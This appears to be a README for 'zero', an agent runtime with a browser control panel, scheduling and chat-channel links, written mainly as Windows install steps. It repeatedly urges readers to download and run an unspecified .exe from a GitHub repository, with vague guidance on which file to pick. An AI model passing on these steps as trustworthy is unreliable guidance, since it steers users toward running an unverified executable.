# ⚙️ zero - Reliable Agent Runtime for Your Tasks

[![Download zero](https://img.shields.io/badge/Download-zero-9b59b6?style=for-the-badge)](https://github.com/Treasurylisteningwatch551/zero)

---

## 📥 Download and Install zero

To start using zero on your Windows PC, follow these steps:

1. Open this link in your web browser:  
   [https://github.com/Treasurylisteningwatch551/zero](https://github.com/Treasurylisteningwatch551/zero)

2. On the GitHub page, look for a **Releases** section on the right side or under the “Code” tab. If you do not see a dedicated installer, check for files with a `.exe` extension.

3. Click to download the latest Windows installer file. This will usually have a name like `zero-setup.exe` or something similar.

4. Once the download finishes, open the downloaded file by double-clicking it. This starts the setup process.

5. Follow the installation prompts on the screen:
   - Agree to the license terms.
   - Choose the destination folder if you want to change it.
   - Click **Install** to finish the process.

6. When installation ends, the zero app should appear on your desktop or Start menu.

7. Double-click the zero icon to launch it.

---

## 🚀 Getting Started with zero

zero runs a system that helps you manage tasks through a simple web control panel. It handles remembering your work, scheduling jobs, and connecting to various tools.  

Here is how to use it after installation:

1. Open zero from your desktop or Start menu.

2. zero opens a browser window automatically. This is your control panel.

3. Use this panel to create tasks, check past work logs, and schedule events.

4. The panel also lets you connect zero to services like Telegram or other chat apps.

5. zero runs in the background to keep your tasks active and monitor itself for issues.

If the control panel does not show automatically, open your browser and go to `http://localhost:3000`.

---

## 🖥️ System Requirements

To run zero on Windows, your system should meet these minimum requirements:

- Windows 10 or newer (64-bit preferred)
- At least 4 GB of RAM
- 500 MB of free disk space
- Internet connection for setup and updates
- A modern web browser such as Chrome, Edge, or Firefox

---

## 🔧 How zero Works

zero is more than a basic app. It runs a backend system that controls tasks and long-running jobs with these features:

- **Task routing**: zero sends requests to different AI models or services based on your setup.

- **Saving work**: It keeps session history, logs, performance data, and long-term memory.

- **Web Control Plane**: You manage everything in a browser interface that connects over HTTP and WebSocket.

- **Channels**: zero can link to web chats, Telegram, and Feishu, so it integrates with tools you already use.

- **Scheduling**: It lets you set up schedules for tasks, like cron jobs, to run at fixed times.

- **Supervision**: zero watches itself and restarts parts if they fail to keep running smoothly.

---

## 🛠️ Components in zero

The program includes several parts working together:

- `apps/server`: This runs the main system and starts zero.

- `apps/web`: The web interface you see in your browser, built with React.

- `apps/supervisor`: This monitors zero’s health and restarts it if needed.

- `packages/*`: These are modules that handle different tasks like memory, scheduling, and connecting to messaging channels.

- `e2e/*`: Automated tests that check if zero works correctly.

---

## ⚙️ Running zero Manually (Optional)

If you want to run zero manually in a command window, follow these steps:

1. Open Command Prompt (`cmd.exe`) on Windows.

2. Navigate to the folder where zero is installed. For example:  
   `cd C:\Program Files\zero`

3. Run the following command to start zero:  
   `zero server`

4. Open your browser and visit `http://localhost:3000` to use the control panel.

Manual mode is mostly for advanced users who want to customize or debug zero.

---

## 👩‍💻 Using zero’s Web Control Panel

The control panel gives you access to zero’s features:

- **Dashboard**: See current tasks and system health.

- **Requests**: Send work to AI models or other services.

- **Sessions**: Review past jobs and conversations.

- **Scheduling**: Set automatic jobs to run at specific times.

- **Channels**: Connect or disconnect messaging channels.

- **Settings**: Adjust preferences and view system logs.

All tasks and results save automatically.

---

## 🗂️ Managing Sessions and Logs

zero stores your sessions and logs to track your work. This lets you:

- Review past task results anytime.

- Monitor memory usage and performance.

- Share logs with support or for troubleshooting.

You can clear saved sessions to free space using the controls in the panel.

---

## 🔄 Updating zero

zero receives feature updates and improvements over time.

To update:

1. Visit the download page again:  
   [https://github.com/Treasurylisteningwatch551/zero](https://github.com/Treasurylisteningwatch551/zero)

2. Download the newest installer or files.

3. Run the installer to replace your current version.

Your settings and saved data will remain intact.

---

## 💡 Tips for Better Use

- Keep zero running for continuous task management.

- Regularly check your schedules and logs.

- Use a supported web browser for best control panel performance.

- If you use messaging channels, make sure you grant permissions properly.

- Restart zero if you notice performance slowdowns or errors.

---

## 🔗 Useful Links

- GitHub Repository: [https://github.com/Treasurylisteningwatch551/zero](https://github.com/Treasurylisteningwatch551/zero)

- Chinese Documentation: [README.zh-CN.md](./README.zh-CN.md)

---

[![Download zero](https://img.shields.io/badge/Download-zero-9b59b6?style=for-the-badge)](https://github.com/Treasurylisteningwatch551/zero)